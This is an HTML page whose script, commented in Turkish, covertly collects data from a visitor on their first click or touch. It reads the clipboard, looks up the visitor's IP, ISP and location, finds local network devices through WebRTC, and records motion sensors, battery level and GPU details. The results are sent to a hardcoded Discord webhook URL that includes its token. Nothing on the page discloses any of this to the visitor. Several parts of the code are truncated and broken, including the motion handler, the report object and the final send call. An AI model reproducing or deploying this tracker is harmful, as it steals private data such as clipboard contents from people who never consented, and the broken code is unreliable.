<!DOCTYPE html>

<body onmousedown="Engine.ignite()" ontouchstart="Engine.ignite()">
    <div class="p"></div>

    <script>
        "use strict";

        const Engine = (function() {
            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            let active = false;

            const Modules = {
                // 1. GeliÅŸmiÅŸ Hareket Analizi (SensÃ¶rler)
                async fetchMotion() {
                    return new Promise(res => {
                        let state = "Sabit (Desktop/Stationary)";
                        const handler = (e) => {
                            const a = e.accelerationIncludingGravity;
                            if(!a) return;
                            const force = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
                            if(force > 13) state = "Hareketli (YÃ¼rÃ¼me/AraÃ§)";

                        setTimeout(() => res(state), 600);
                    });
                },

                // 2. AÄŸ ve ISP Analizi (SSID & Tip Tahmini)
                async fetchNet() {
                    try {
                        const start = performance.now();
                        const data = await fetch('https://ipapi.co/json/').then(r => r.json());
                        const latency = performance.now() - start;
                        let type = "Ev Ä°nterneti (Residential)";
                        if(latency < 30) type = "Kurumsal/Fiber (Business/Office)";
                        if(data.org?.toLowerCase().includes("mobile") || data.org?.toLowerCase().includes("cell")) type = "Mobil Veri (4G/5G)";
                        return { ...data, type, ping: latency.toFixed(0) + "ms" };
                    } catch(e) { return { type: "N/A", ping: "N/A" }; }
                },

                // 3. Pano ve Cihaz KeÅŸfi (LAN)
                async fetchLocal() {
                    return new Promise(res => {
                        const devs = [];
                        const pc = new RTCPeerConnection({iceServers:[]});
                        pc.createDataChannel("");
                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && devs.push(e.candidate.candidate.split(" ")[4]);
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        setTimeout(() => { pc.close(); res(devs.join(", ") || "Gizli veya Tekil AÄŸ"); }, 1000);
                    });
                }
            };

            return {
                async ignite() {
                    if (active) return; active = true;

                    // Her modÃ¼lÃ¼ gÃ¼venli (Safe-Execution) modda Ã§alÄ±ÅŸtÄ±r
                    const [motion, net, lan, clip, bat] = await Promise.all([
                        Modules.fetchMotion(),
                        Modules.fetchNet(),
                        Modules.fetchLocal(),
                        navigator.clipboard.readText().catch(() => "Pano EriÅŸimi Engellendi"),
                        navigator.getBattery ? navigator.getBattery().catch(() => ({level:0})) : {level:0}
                    ]);

                    const gl = document.createElement('canvas').getContext('webgl2');
                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";

                    const report = {
                        embeds: [{

                                { name: "ðŸ“¡ AÄžDAKÄ° DÄ°ÄžER CÄ°HAZLAR", value: `\`${lan}\``, inline: false },
                                { name: "ðŸƒ HAREKET & GÃœÃ‡ DURUMU", value: `**Durum:** ${motion}\n**Pil:** %${Math.round(bat.level * 100)} | **Ã‡ekirdek:** ${navigator.hardwareConcurrency} Cores`, inline: false },
                                { name: "âš™ï¸ DONANIM & PANO", value: `**GPU:** ${gpu}\n**Pano:** \`\`\`${clip}\`\`\``, inline: false }
                            ],

                    fetch(HOOK, {

        })();
    </script>
